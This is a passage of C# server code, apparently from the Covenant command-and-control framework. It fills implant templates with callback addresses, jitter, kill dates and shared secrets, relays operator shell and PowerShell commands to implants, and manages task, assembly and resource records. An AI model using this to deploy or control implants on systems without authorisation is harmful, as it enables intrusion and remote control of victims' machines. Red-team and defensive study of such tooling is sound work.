                            .Replace("{{REPLACE_PROFILE_WRITE_FORMAT}}", this.FormatForVerbatimString(httpProfile.HttpPostRequest.Replace("{DATA}", "{0}").Replace("{GUID}", "{1}")))
                            .Replace("{{REPLACE_PIPE_NAME}}", grunt.SMBPipeName)
                            .Replace("{{REPLACE_GRUNT_GUID}}", this.FormatForVerbatimString(grunt.OriginalServerGuid))
                            .Replace("{{REPLACE_DELAY}}", this.FormatForVerbatimString(grunt.Delay.ToString()))
                            .Replace("{{REPLACE_JITTER_PERCENT}}", this.FormatForVerbatimString(grunt.JitterPercent.ToString()))
                            .Replace("{{REPLACE_CONNECT_ATTEMPTS}}", this.FormatForVerbatimString(grunt.ConnectAttempts.ToString()))
                            .Replace("{{REPLACE_KILL_DATE}}", this.FormatForVerbatimString(grunt.KillDate.ToBinary().ToString()))
                            .Replace("{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}", this.FormatForVerbatimString(grunt.GruntSharedSecretPassword));
                    }
                    return CodeTemplate;
                case ProfileType.Bridge:
                    BridgeProfile bridgeProfile = (BridgeProfile)profile;
                    BridgeListener bridgeListener = (BridgeListener)listener;
                    return CodeTemplate
                        .Replace("// {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}", bridgeProfile.MessageTransform)
                        .Replace("// {{REPLACE_BRIDGE_MESSENGER_CODE}}", bridgeProfile.BridgeMessengerCode)
                        .Replace("{{REPLACE_PROFILE_WRITE_FORMAT}}", bridgeProfile.WriteFormat.Replace("{DATA}", "{0}").Replace("{GUID}", "{1}"))
                        .Replace("{{REPLACE_PROFILE_READ_FORMAT}}", bridgeProfile.ReadFormat.Replace("{DATA}", "{0}").Replace("{GUID}", "{1}"))
                        .Replace("{{REPLACE_PIPE_NAME}}", grunt.SMBPipeName)
                        .Replace("{{REPLACE_COVENANT_URI}}", this.FormatForVerbatimString(bridgeListener.ConnectAddresses[0] + ":" + bridgeListener.ConnectPort))
                        .Replace("{{REPLACE_GRUNT_GUID}}", this.FormatForVerbatimString(grunt.OriginalServerGuid))
                        .Replace("{{REPLACE_DELAY}}", this.FormatForVerbatimString(grunt.Delay.ToString()))
                        .Replace("{{REPLACE_JITTER_PERCENT}}", this.FormatForVerbatimString(grunt.JitterPercent.ToString()))
                        .Replace("{{REPLACE_CONNECT_ATTEMPTS}}", this.FormatForVerbatimString(grunt.ConnectAttempts.ToString()))
                        .Replace("{{REPLACE_KILL_DATE}}", this.FormatForVerbatimString(grunt.KillDate.ToBinary().ToString()))
                        .Replace("{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}", this.FormatForVerbatimString(grunt.GruntSharedSecretPassword));
                default:
                    return CodeTemplate;
            }
        }

        private string FormatForVerbatimString(string replacement)
        {
            return replacement.Replace("\"", "\"\"").Replace("{", "{{").Replace("}", "}}").Replace("{{0}}", "{0}");
        }

        private bool GetPathToChildGrunt(int ParentId, int ChildId, ref List<string> GruntPath)
        {
            if (ParentId == ChildId)
            {
                return true;
            }

            Grunt parentGrunt = _context.Grunts.FirstOrDefault(G => G.Id == ParentId);
            Grunt childGrunt = _context.Grunts.FirstOrDefault(G => G.Id == ChildId);
            if (parentGrunt == null || childGrunt == null)
            {
                return false;
            }
            if (parentGrunt.Children.Contains(childGrunt.GUID))
            {
                GruntPath.Add(childGrunt.GUID);
                return true;
            }
            foreach (string child in parentGrunt.Children)
            {
                Grunt directChild = _context.Grunts.FirstOrDefault(G => G.GUID == child);
                if (directChild == null)
                {
                    return false;
                }
                if (GetPathToChildGrunt(directChild.Id, ChildId, ref GruntPath))
                {
                    GruntPath.Add(directChild.GUID);
                    return true;
                }
            }
            return false;
        }

        public async Task<GruntCommand> InteractGrunt(int GruntId, string UserId, string UserInput)
        {
            Grunt grunt = await this.GetGrunt(GruntId);
            CovenantUser user = await this.GetUser(UserId);

            List<ParsedParameter> parameters = ParsedParameter.GetParsedCommandParameters(UserInput);
            string commandName = parameters.Count > 0 ? parameters.FirstOrDefault().Value : "";
            GruntTask commandTask = null;
            try
            {
                commandTask = await this.GetGruntTaskByName(commandName, grunt.DotNetVersion);
                if (commandTask.Options.Count == 1 && new List<string> { "Command", "ShellCommand", "PowerShellCommand", "Code" }.Contains(commandTask.Options[0].Name))
                {
                    string val = UserInput.Substring(UserInput.IndexOf(" ", StringComparison.Ordinal) + 1);
                    if (val.StartsWith("/", StringComparison.Ordinal) && val.IndexOf(":", StringComparison.Ordinal) != -1)
                    {
                        int labelIndex = val.IndexOf(":", StringComparison.Ordinal);
                        string label = val.Substring(1, labelIndex - 1);
                        val = val.Substring(labelIndex + 1, val.Length - labelIndex - 1);
                    }
                    parameters = new List<ParsedParameter>
                    {
                        new ParsedParameter
                        {
                            Value = commandTask.Name, Label = "", IsLabeled = false, Position = 0
                        },
                        new ParsedParameter
                        {
                            Value = val.TrimOnceSymmetric('"').Replace("\\\"", "\""),
                            Label = "", IsLabeled = false, Position = 0
                        }
                    };
                }
            }
            catch (ControllerNotFoundException) { }

            GruntCommand GruntCommand = await this.CreateGruntCommand(new GruntCommand
            {
                Command = GetCommandFromInput(UserInput, parameters, commandTask),
                CommandTime = DateTime.UtcNow,
                UserId = user.Id,
                GruntId = grunt.Id,
                CommandOutputId = 0,
                CommandOutput = new CommandOutput()
            });
            try
            {
                string output = "";
                if (commandName.ToLower() == "help")
                {
                    output = await StartHelpCommand(grunt, parameters);
                }
                else if (commandName.ToLower() == "note")
                {
                    grunt.Note = string.Join(" ", parameters.Skip(1).Select(P => P.Value).ToArray());
                    await this.EditGrunt(grunt, user);
                    output = "Note: " + grunt.Note;
                }
                else if (commandTask != null && commandTask.CompatibleDotNetVersions.Contains(grunt.DotNetVersion))
                {
                    string errors = await this.ParseParametersIntoTask(commandTask, parameters);
                    if (!string.IsNullOrEmpty(errors))
                    {
                        this.DisposeContext();
                        GruntCommand = await this.GetGruntCommand(GruntCommand.Id);
                        GruntCommand.CommandOutput ??= await this.GetCommandOutput(GruntCommand.CommandOutputId);
                        GruntCommand.CommandOutput.Output = errors;
                        return await this.EditGruntCommand(GruntCommand);
                    }
                    // Parameters have parsed successfully
                    commandTask = await this.EditGruntTask(commandTask);
                    GruntTasking tasking = await StartGruntTasking(grunt, commandTask, GruntCommand);
                    this.DisposeContext();
                    GruntCommand = await this.GetGruntCommand(GruntCommand.Id);
                }
                else if (commandTask != null && !commandTask.CompatibleDotNetVersions.Contains(grunt.DotNetVersion))
                {
                    output = ConsoleWriter.PrintFormattedErrorLine($"Task: {commandTask.Name} is not compatible with DotNetVersion: {grunt.DotNetVersion.ToString()}");
                }
                else
                {
                    output = ConsoleWriter.PrintFormattedErrorLine("Unrecognized command");
                }
                this.DisposeContext();
                GruntCommand = await this.GetGruntCommand(GruntCommand.Id);
                GruntCommand.CommandOutput ??= await this.GetCommandOutput(GruntCommand.CommandOutputId);
                if (GruntCommand.CommandOutput.Output == "" && output != "")
                {
                    GruntCommand.CommandOutput.Output = output;
                }
                return await this.EditGruntCommand(GruntCommand);
            }
            catch (Exception e)
            {
                this.DisposeContext();
                GruntCommand = await this.GetGruntCommand(GruntCommand.Id);
                GruntCommand.CommandOutput ??= await this.GetCommandOutput(GruntCommand.CommandOutputId);
                GruntCommand.CommandOutput.Output = ConsoleWriter.PrintFormattedErrorLine($"{e.Message}{Environment.NewLine}{e.StackTrace}");
                return await this.EditGruntCommand(GruntCommand);
            }
        }
        #endregion

        #region GruntTaskComponent ReferenceAssembly Actions
        public async Task<IEnumerable<ReferenceAssembly>> GetReferenceAssemblies()
        {
            return await _context.ReferenceAssemblies.ToListAsync();
        }

        public async Task<IEnumerable<ReferenceAssembly>> GetDefaultNet35ReferenceAssemblies()
        {
            return new List<ReferenceAssembly>
            {
                await this.GetReferenceAssemblyByName("mscorlib.dll", Common.DotNetVersion.Net35),
                await this.GetReferenceAssemblyByName("System.dll", Common.DotNetVersion.Net35),
                await this.GetReferenceAssemblyByName("System.Core.dll", Common.DotNetVersion.Net35)
            };
        }

        public async Task<IEnumerable<ReferenceAssembly>> GetDefaultNet40ReferenceAssemblies()
        {
            return new List<ReferenceAssembly>
            {
                await this.GetReferenceAssemblyByName("mscorlib.dll", Common.DotNetVersion.Net40),
                await this.GetReferenceAssemblyByName("System.dll", Common.DotNetVersion.Net40),
                await this.GetReferenceAssemblyByName("System.Core.dll", Common.DotNetVersion.Net40)
            };
        }

        public async Task<ReferenceAssembly> GetReferenceAssembly(int id)
        {
            ReferenceAssembly assembly = await _context.ReferenceAssemblies.FirstOrDefaultAsync(RA => RA.Id == id);
            if (assembly == null)
            {
                throw new ControllerNotFoundException($"NotFound - ReferenceAssembly with id: {id}");
            }
            return assembly;
        }

        public async Task<ReferenceAssembly> GetReferenceAssemblyByName(string name, Common.DotNetVersion version)
        {
            ReferenceAssembly assembly = await _context.ReferenceAssemblies
                .Where(RA => RA.Name == name && RA.DotNetVersion == version)
                .FirstOrDefaultAsync();
            if (assembly == null)
            {
                throw new ControllerNotFoundException($"NotFound - ReferenceAssembly with Name: {name} and DotNetVersion: {version}");
            }
            return assembly;
        }

        public async Task<ReferenceAssembly> CreateReferenceAssembly(ReferenceAssembly assembly)
        {
            await _context.ReferenceAssemblies.AddAsync(assembly);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateReferenceAssembly(this, assembly);
            return await this.GetReferenceAssembly(assembly.Id);
        }

        public async Task<IEnumerable<ReferenceAssembly>> CreateReferenceAssemblies(params ReferenceAssembly[] assemblies)
        {
            await _context.ReferenceAssemblies.AddRangeAsync(assemblies);
            await _context.SaveChangesAsync();
            return assemblies;
        }

        public async Task<ReferenceAssembly> EditReferenceAssembly(ReferenceAssembly assembly)
        {
            ReferenceAssembly matchingAssembly = await this.GetReferenceAssembly(assembly.Id);
            matchingAssembly.Name = assembly.Name;
            matchingAssembly.Location = assembly.Location;
            matchingAssembly.DotNetVersion = assembly.DotNetVersion;
            _context.ReferenceAssemblies.Update(matchingAssembly);
            await _context.SaveChangesAsync();
            // _notifier.OnEditReferenceAssembly(this, matchingAssembly);
            return await this.GetReferenceAssembly(matchingAssembly.Id);
        }

        public async Task DeleteReferenceAssembly(int id)
        {
            ReferenceAssembly matchingAssembly = await this.GetReferenceAssembly(id);
            _context.ReferenceAssemblies.Remove(matchingAssembly);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteReferenceAssembly(this, matchingAssembly.Id);
        }
        #endregion

        #region GruntTaskComponents EmbeddedResource Actions
        public async Task<IEnumerable<EmbeddedResource>> GetEmbeddedResources()
        {
            return await _context.EmbeddedResources.ToListAsync();
        }

        public async Task<EmbeddedResource> GetEmbeddedResource(int id)
        {
            EmbeddedResource resource = await _context.EmbeddedResources.FirstOrDefaultAsync(ER => ER.Id == id);
            if (resource == null)
            {
                throw new ControllerNotFoundException($"NotFound - EmbeddedResource with id: {id}");
            }
            return resource;
        }

        public async Task<EmbeddedResource> GetEmbeddedResourceByName(string name)
        {
            EmbeddedResource resource = await _context.EmbeddedResources
                .Where(ER => ER.Name == name)
                .FirstOrDefaultAsync();
            if (resource == null)
            {
                throw new ControllerNotFoundException($"NotFound - EmbeddedResource with Name: {name}");
            }
            return resource;
        }

        public async Task<EmbeddedResource> CreateEmbeddedResource(EmbeddedResource resource)
        {
            await _context.EmbeddedResources.AddAsync(resource);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateEmbeddedResource(this, resource);
            return await this.GetEmbeddedResource(resource.Id);
        }

        public async Task<IEnumerable<EmbeddedResource>> CreateEmbeddedResources(params EmbeddedResource[] resources)
        {
            await _context.EmbeddedResources.AddRangeAsync(resources);
            await _context.SaveChangesAsync();
            return resources;
        }

        public async Task<EmbeddedResource> EditEmbeddedResource(EmbeddedResource resource)
        {
            EmbeddedResource matchingResource = await this.GetEmbeddedResource(resource.Id);
            matchingResource.Name = resource.Name;
            matchingResource.Location = resource.Location;
            _context.EmbeddedResources.Update(matchingResource);
            await _context.SaveChangesAsync();
            // _notifier.OnEditEmbeddedResource(this, resource);
            return await this.GetEmbeddedResource(matchingResource.Id);
        }

        public async Task DeleteEmbeddedResource(int id)
        {
            EmbeddedResource matchingResource = await this.GetEmbeddedResource(id);
            _context.EmbeddedResources.Remove(matchingResource);
            // _notifier.OnDeleteEmbeddedResource(this, matchingResource.Id);
            await _context.SaveChangesAsync();
        }
        #endregion

        #region GruntTaskComponents ReferenceSourceLibrary Actions
        public async Task<IEnumerable<ReferenceSourceLibrary>> GetReferenceSourceLibraries()
        {
            return await _context.ReferenceSourceLibraries
                .Include("ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .ToListAsync();
        }

        public async Task<ReferenceSourceLibrary> GetReferenceSourceLibrary(int id)
        {
            ReferenceSourceLibrary library = await _context.ReferenceSourceLibraries
                .Where(RSL => RSL.Id == id)
                .Include("ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .FirstOrDefaultAsync();
            if (library == null)
            {
                throw new ControllerNotFoundException($"NotFound - ReferenceSourceLibrary with id: {id}");
            }
            return library;
        }

        public async Task<ReferenceSourceLibrary> GetReferenceSourceLibraryByName(string name)
        {
            ReferenceSourceLibrary library = await _context.ReferenceSourceLibraries
                .Where(RSL => RSL.Name == name)
                .Include("ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .FirstOrDefaultAsync();
            if (library == null)
            {
                throw new ControllerNotFoundException($"NotFound - ReferenceSourceLibrary with Name: {name}");
            }
            return library;
        }

        public async Task<ReferenceSourceLibrary> CreateReferenceSourceLibrary(ReferenceSourceLibrary library)
        {
            await _context.ReferenceSourceLibraries.AddAsync(library);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateReferenceSourceLibrary(this, library);
            return await this.GetReferenceSourceLibrary(library.Id);
        }

        public async Task<IEnumerable<ReferenceSourceLibrary>> CreateReferenceSourceLibraries(params ReferenceSourceLibrary[] libraries)
        {
            await _context.ReferenceSourceLibraries.AddRangeAsync(libraries);
            await _context.SaveChangesAsync();
            return libraries;
        }

        public async Task<ReferenceSourceLibrary> EditReferenceSourceLibrary(ReferenceSourceLibrary library)
        {
            ReferenceSourceLibrary matchingLibrary = await this.GetReferenceSourceLibrary(library.Id);
            matchingLibrary.Name = library.Name;
            matchingLibrary.Description = library.Description;
            matchingLibrary.Location = library.Location;

            var removeAssemblies = matchingLibrary.ReferenceAssemblies.Select(MRA => MRA.Id).Except(library.ReferenceAssemblies.Select(RA => RA.Id));
            var addAssemblies = library.ReferenceAssemblies.Select(MRA => MRA.Id).Except(matchingLibrary.ReferenceAssemblies.Select(MRA => MRA.Id));
            removeAssemblies.ToList().ForEach(async RA => matchingLibrary.Remove(await this.GetReferenceAssembly(RA)));
            addAssemblies.ToList().ForEach(async AA => matchingLibrary.Add(await this.GetReferenceAssembly(AA)));

            var removeResources = matchingLibrary.EmbeddedResources.Select(MER => MER.Id).Except(library.EmbeddedResources.Select(ER => ER.Id));
            var addResources = library.EmbeddedResources.Select(MER => MER.Id).Except(matchingLibrary.EmbeddedResources.Select(MER => MER.Id));
            removeResources.ToList().ForEach(async RR => matchingLibrary.Remove(await this.GetEmbeddedResource(RR)));
            addResources.ToList().ForEach(async AR => matchingLibrary.Add(await this.GetEmbeddedResource(AR)));

            _context.ReferenceSourceLibraries.Update(matchingLibrary);
            await _context.SaveChangesAsync();
            // _notifier.OnEditReferenceSourceLibrary(this, library);
            return await this.GetReferenceSourceLibrary(matchingLibrary.Id);
        }

        public async Task DeleteReferenceSourceLibrary(int id)
        {
            ReferenceSourceLibrary referenceSourceLibrary = await this.GetReferenceSourceLibrary(id);
            _context.ReferenceSourceLibraries.Remove(referenceSourceLibrary);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteReferenceSourceLibrary(this, referenceSourceLibrary.Id);
        }
        #endregion

        #region GruntTaskOption Actions
        public async Task<GruntTaskOption> EditGruntTaskOption(GruntTaskOption option)
        {
            _context.Entry(option).State = EntityState.Modified;
            await _context.SaveChangesAsync();
            return option;
        }

        public async Task<GruntTaskOption> CreateGruntTaskOption(GruntTaskOption option)
        {
            await _context.AddAsync(option);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateGruntTaskOption(this, option);
            return option;
        }

        public async Task<IEnumerable<GruntTaskOption>> CreateGruntTaskOptions(params GruntTaskOption[] options)
        {
            await _context.AddRangeAsync(options);
            await _context.SaveChangesAsync();
            return options;
        }
        #endregion

        #region GruntTaskAuthor Actions
        public async Task<IEnumerable<GruntTaskAuthor>> GetGruntTaskAuthors()
        {
            return await _context.GruntTaskAuthors.ToListAsync();
        }

        public async Task<GruntTaskAuthor> GetGruntTaskAuthor(int id)
        {
            GruntTaskAuthor author = await _context.GruntTaskAuthors.FirstOrDefaultAsync(A => A.Id == id);
            if (author == null)
            {
                throw new ControllerNotFoundException($"NotFound - GruntTaskAuthor with id: {id}");
            }
            return author;
        }

        public async Task<GruntTaskAuthor> GetGruntTaskAuthorByName(string Name)
        {
            GruntTaskAuthor author = await _context.GruntTaskAuthors.FirstOrDefaultAsync(A => A.Name == Name);
            if (author == null)
            {
                throw new ControllerNotFoundException($"NotFound - GruntTaskAuthor with Name: {Name}");
            }
            return author;
        }

        public async Task<GruntTaskAuthor> CreateGruntTaskAuthor(GruntTaskAuthor author)
        {
            await _context.AddAsync(author);
            await _context.SaveChangesAsync();
            // _notifier.OnCreateGruntTaskOption(this, option);
            return author;
        }

        public async Task<GruntTaskAuthor> EditGruntTaskAuthor(GruntTaskAuthor author)
        {
            _context.Update(author);
            await _context.SaveChangesAsync();
            return author;
        }
        #endregion

        #region GruntTask Actions
        public async Task<IEnumerable<GruntTask>> GetGruntTasks()
        {
            return await _context.GruntTasks
                .Include(T => T.Options)
                .Include(T => T.Author)
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary")
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .Include("GruntTaskReferenceAssemblies.ReferenceAssembly")
                .Include("GruntTaskEmbeddedResources.EmbeddedResource")
                .ToListAsync();
        }

        public async Task<IEnumerable<GruntTask>> GetGruntTasksForGrunt(int gruntId)
        {
            Grunt grunt = await this.GetGrunt(gruntId);
            return _context.GruntTasks
                // .Where(T => T.SupportedDotNetVersions.Contains(version))
                .Include(T => T.Options)
                .Include(T => T.Author)
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary")
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .Include("GruntTaskReferenceAssemblies.ReferenceAssembly")
                .Include("GruntTaskEmbeddedResources.EmbeddedResource")
                .AsEnumerable()
                .Where(T => T.CompatibleDotNetVersions.Contains(grunt.DotNetVersion));
        }

        public async Task<GruntTask> GetGruntTask(int id)
        {
            GruntTask task = await _context.GruntTasks
                .Where(T => T.Id == id)
                .Include(T => T.Options)
                .Include(T => T.Author)
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary")
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .Include("GruntTaskReferenceAssemblies.ReferenceAssembly")
                .Include("GruntTaskEmbeddedResources.EmbeddedResource")
                .FirstOrDefaultAsync();
            if (task == null)
            {
                throw new ControllerNotFoundException($"NotFound - GruntTask with id: {id}");
            }
            return task;
        }

        public async Task<GruntTask> GetGruntTaskByName(string name, Common.DotNetVersion version = Common.DotNetVersion.Net35)
        {
            string lower = name.ToLower();

            GruntTask task = _context.GruntTasks
                .Where(T => T.Name.ToLower() == lower)
                // .Where(T => T.CompatibleDotNetVersions.Contains(version))
                .Include(T => T.Options)
                .Include(T => T.Author)
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary")
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                .Include("GruntTaskReferenceAssemblies.ReferenceAssembly")
                .Include("GruntTaskEmbeddedResources.EmbeddedResource")
                .AsEnumerable()
                .Where(T => T.CompatibleDotNetVersions.Contains(version))
                .FirstOrDefault();
            if (task == null)
            {
                // Probably bad performance here
                task = _context.GruntTasks
                    .Include(T => T.Options)
                    .Include(T => T.Author)
                    .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary")
                    .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryReferenceAssemblies.ReferenceAssembly")
                    .Include("GruntTaskReferenceSourceLibraries.ReferenceSourceLibrary.ReferenceSourceLibraryEmbeddedResources.EmbeddedResource")
                    .Include("GruntTaskReferenceAssemblies.ReferenceAssembly")
                    .Include("GruntTaskEmbeddedResources.EmbeddedResource")
                    .AsEnumerable()
                    .Where(T => T.Aliases.Any(A => A.Equals(lower, StringComparison.CurrentCultureIgnoreCase)))
                    .Where(T => T.CompatibleDotNetVersions.Contains(version))
                    .FirstOrDefault();
                if (task == null)
                {
                    throw new ControllerNotFoundException($"NotFound - GruntTask with Name: {name}");
                }
            }
            return await Task.FromResult(task);
        }

        private async Task<string> GetUsageForGruntTask(int id)
        {
            return await GetUsageForGruntTask(await this.GetGruntTask(id));
        }

        private async Task<string> GetUsageForGruntTask(GruntTask task)
        {
            string usage = "Usage: " + task.Name;
            foreach (var option in task.Options)
            {
                if (option.Optional)
                {
                    usage += "[ <" + option.Name.ToLower() + "> ]";
                }
                else
                {
                    usage += " <" + option.Name.ToLower() + ">";
                }
            }
            return await Task.FromResult(usage);
        }

        public async Task<GruntTask> CreateGruntTask(GruntTask task)
        {
            List<GruntTaskOption> options = task.Options.ToList();
            List<EmbeddedResource> resources = task.EmbeddedResources.ToList();
            List<ReferenceAssembly> assemblies = task.ReferenceAssemblies.ToList();
            List<ReferenceSourceLibrary> libraries = task.ReferenceSourceLibraries.ToList();
            task.Options = new List<GruntTaskOption>();
            task.EmbeddedResources.ForEach(ER => task.Remove(ER));
            task.ReferenceAssemblies.ForEach(RA => task.Remove(RA));
            task.ReferenceSourceLibraries.ForEach(RSL => task.Remove(RSL));

            GruntTaskAuthor author = await _context.GruntTaskAuthors.FirstOrDefaultAsync(A => A.Name == task.Author.Name);
            if (author != null)
            {
                task.AuthorId = author.Id;
                task.Author = author;
            }
            else
            {
                await _context.GruntTaskAuthors.AddAsync(task.Author);
                await _context.SaveChangesAsync();
                task.AuthorId = task.Author.Id;
            }

            await _context.GruntTasks.AddAsync(task);
            await _context.SaveChangesAsync();

            foreach (GruntTaskOption option in options)
            {
                option.GruntTaskId = task.Id;
                await _context.AddAsync(option);
                await _context.SaveChangesAsync();
            }
            foreach (EmbeddedResource resource in resources)
            {
                await this.CreateEntities(
                    new GruntTaskEmbeddedResource
                    {
                        EmbeddedResource = await this.GetEmbeddedResourceByName(resource.Name),
                        GruntTask = task
                    }
                );
            }
            foreach (ReferenceAssembly assembly in assemblies)
            {
                await this.CreateEntities(
                    new GruntTaskReferenceAssembly
                    {
                        ReferenceAssembly = await this.GetReferenceAssemblyByName(assembly.Name, assembly.DotNetVersion),
                        GruntTask = task
                    }
                );
            }
            foreach (ReferenceSourceLibrary library in libraries)
            {
                await this.CreateEntities(
                    new GruntTaskReferenceSourceLibrary
                    {
                        ReferenceSourceLibrary = await this.GetReferenceSourceLibraryByName(library.Name),
                        GruntTask = task
                    }
                );
            }
            await _context.SaveChangesAsync();
            // _notifier.OnCreateGruntTask(this, task);
            return await this.GetGruntTask(task.Id);
        }

        public async Task<IEnumerable<GruntTask>> CreateGruntTasks(params GruntTask[] tasks)
        {
            List<GruntTask> createdTasks = new List<GruntTask>();
            foreach (GruntTask t in tasks)
            {
                createdTasks.Add(await this.CreateGruntTask(t));
            }
            return createdTasks;
        }

        public async Task<GruntTask> EditGruntTask(GruntTask task)
        {
            GruntTask updatingTask = await this.GetGruntTask(task.Id);
            updatingTask.Name = task.Name;
            updatingTask.Description = task.Description;
            updatingTask.Help = task.Help;
            updatingTask.Aliases = task.Aliases;
            if (updatingTask.Code != task.Code)
            {
                updatingTask.Code = task.Code;
                updatingTask.Compiled = false;
            }
            else
            {
                updatingTask.Compiled = task.Compiled;
            }
            updatingTask.UnsafeCompile = task.UnsafeCompile;
            updatingTask.TokenTask = task.TokenTask;
            updatingTask.TaskingType = task.TaskingType;

            task.Options.Where(O => O.Id == 0).ToList().ForEach(async O => await this.CreateGruntTaskOption(O));
            var removeOptions = updatingTask.Options.Select(UT => UT.Id).Except(task.Options.Select(O => O.Id));
            removeOptions.ToList().ForEach(RO => updatingTask.Options.Remove(updatingTask.Options.FirstOrDefault(UO => UO.Id == RO)));
            foreach (var option in updatingTask.Options)
            {
                var newOption = task.Options.FirstOrDefault(T => T.Id == option.Id);
                if (newOption != null)
                {
                    option.Name = newOption.Name;
                    option.Description = newOption.Description;
                    option.Value = newOption.Value;
                    option.SuggestedValues = newOption.SuggestedValues;
                    option.Optional = newOption.Optional;
                    option.DisplayInCommand = newOption.DisplayInCommand;
                }
            }

            var removeAssemblies = updatingTask.ReferenceAssemblies.Select(MRA => MRA.Id).Except(task.ReferenceAssemblies.Select(RA => RA.Id));
            var addAssemblies = task.ReferenceAssemblies.Select(MRA => MRA.Id).Except(updatingTask.ReferenceAssemblies.Select(MRA => MRA.Id));
            removeAssemblies.ToList().ForEach(async RA => updatingTask.Remove(await this.GetReferenceAssembly(RA)));
            addAssemblies.ToList().ForEach(async AA => updatingTask.Add(await this.GetReferenceAssembly(AA)));

            var removeResources = updatingTask.EmbeddedResources.Select(MER => MER.Id).Except(task.EmbeddedResources.Select(ER => ER.Id));
            var addResources = task.EmbeddedResources.Select(MER => MER.Id).Except(updatingTask.EmbeddedResources.Select(MER => MER.Id));
            removeResources.ToList().ForEach(async RR => updatingTask.Remove(await this.GetEmbeddedResource(RR)));
            addResources.ToList().ForEach(async AR => updatingTask.Add(await this.GetEmbeddedResource(AR)));

            var removeLibraries = updatingTask.ReferenceSourceLibraries.Select(MRSL => MRSL.Id).Except(task.ReferenceSourceLibraries.Select(RSL => RSL.Id));
            var addLibraries = task.ReferenceSourceLibraries.Select(RSL => RSL.Id).Except(updatingTask.ReferenceSourceLibraries.Select(MRSL => MRSL.Id));
            removeLibraries.ToList().ForEach(async RL => updatingTask.Remove(await this.GetReferenceSourceLibrary(RL)));
            addLibraries.ToList().ForEach(async AL => updatingTask.Add(await this.GetReferenceSourceLibrary(AL)));

            GruntTaskAuthor author = await _context.GruntTaskAuthors.FirstOrDefaultAsync(A => A.Name == task.Author.Name);
            if (author != null)
            {
                updatingTask.AuthorId = author.Id;
                updatingTask.Author = author;
            }
            else
            {
                await _context.GruntTaskAuthors.AddAsync(task.Author);
                await _context.SaveChangesAsync();
                updatingTask.AuthorId = task.Author.Id;
                updatingTask.Author = task.Author;
            }

            _context.GruntTasks.Update(updatingTask);
            await _context.SaveChangesAsync();

            // _notifier.OnEditGruntTask(this, updatingTask);
            return updatingTask;
        }

        public async Task DeleteGruntTask(int taskId)
        {
            GruntTask removingTask = await this.GetGruntTask(taskId);
            if (removingTask == null)
            {
                throw new ControllerNotFoundException($"NotFound - GruntTask with id: {taskId}");
            }
            _context.GruntTasks.Remove(removingTask);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteGruntTask(this, removingTask.Id);
        }
        #endregion

        #region GruntCommand Actions
        public async Task<IEnumerable<GruntCommand>> GetGruntCommands()
        {
            return await _context.GruntCommands
                .Include(GC => GC.User)
                .Include(GC => GC.GruntTasking)
                    .ThenInclude(GT => GT.GruntTask)
                .ToListAsync();
        }

        public async Task<IEnumerable<GruntCommand>> GetGruntCommandsForGrunt(int gruntId)
        {
            return await _context.GruntCommands
                .Where(GC => GC.GruntId == gruntId)
                .Include(GC => GC.User)
                .Include(GC => GC.GruntTasking)
                    .ThenInclude(GT => GT.GruntTask)
                .ToListAsync();
        }

        public async Task<GruntCommand> GetGruntCommand(int id)
        {
            GruntCommand command = await _context.GruntCommands
                .Where(GC => GC.Id == id)
                .Include(GC => GC.User)
                .Include(GC => GC.GruntTasking)
                    .ThenInclude(GT => GT.GruntTask)
                .FirstOrDefaultAsync();
            if (command == null)
            {
                throw new ControllerNotFoundException($"NotFound - GruntCommand with Id: {id}");
            }
            return command;
        }

        public async Task<GruntCommand> CreateGruntCommand(GruntCommand command)
        {
            await _context.GruntCommands.AddAsync(command);
            await _context.SaveChangesAsync();
            command.Grunt = await this.GetGrunt(command.GruntId);
            command.User = await this.GetUser(command.UserId);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGruntCommand(this, command);
            return command;
        }

        public async Task<IEnumerable<GruntCommand>> CreateGruntCommands(params GruntCommand[] commands)
        {
            await _context.GruntCommands.AddRangeAsync(commands);
            await _context.SaveChangesAsync();
            return commands;
        }

        public async Task<GruntCommand> EditGruntCommand(GruntCommand command)
        {
            GruntCommand updatingCommand = await this.GetGruntCommand(command.Id);
            updatingCommand.Command = command.Command;
